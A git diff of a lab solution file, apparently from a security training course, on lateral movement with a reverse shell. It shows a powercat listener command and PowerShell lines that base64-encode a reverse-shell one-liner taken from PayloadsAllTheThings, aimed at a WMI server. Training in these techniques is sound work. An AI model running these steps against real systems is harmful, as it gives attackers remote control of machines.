@@ -1,11 +1,13 @@
 ## Hands On 7 - Lateral Movement, Reverse Shell
 
+Solution uses the PowerShell reverse shell from PayloadOfAllThings: [Powershell Oneliner Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)
+
 #### Get a reverse shell on WMI server using Win32_Process
 Start the listner:
 
 `powercat -l -v -p 4242 -t 1000`
 
-Start the client up (Using Powershell reverse shell from PayloadOfAllThings)
+Start the client up
 ```
 $utfbytes  = [System.Text.Encoding]::Unicode.GetBytes((Get-Content '.\oneliner.txt'))
 $base64string = [System.Convert]::ToBase64String($utfbytes)
@@ -17,7 +19,7 @@ Start the listner:
 
 `powercat -l -v -p 4242 -t 1000`
 
-Start the client up (Using Powershell reverse shell from PayloadOfAllThings)
+Start the client up
 ```
 $utfbytes  = [System.Text.Encoding]::Unicode.GetBytes((Get-Content '.\oneliner.txt'))
 $base64string = [System.Convert]::ToBase64String($utfbytes)
